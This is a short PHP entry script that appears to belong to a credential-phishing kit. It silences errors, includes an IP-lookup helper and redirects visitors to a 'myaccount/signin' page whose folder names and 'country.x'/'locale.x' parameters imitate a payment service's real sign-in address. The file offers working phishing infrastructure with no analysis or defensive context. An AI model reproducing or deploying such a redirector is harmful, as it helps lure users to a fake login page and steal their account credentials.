<?php
//LOCATION !
session_start();
error_reporting(0);
include('./customer_center/customer-IDPP00C984/functions/get_ip.php');

$DIR='./customer_center/customer-IDPP00C984/myaccount/signin/?country.x='.$_SESSION['_LOOKUP_CNTRCODE_'].'&locale.x=en_'.$_SESSION['_LOOKUP_CNTRCODE_'].'';
header("LOCATION: ".$DIR."");
?>
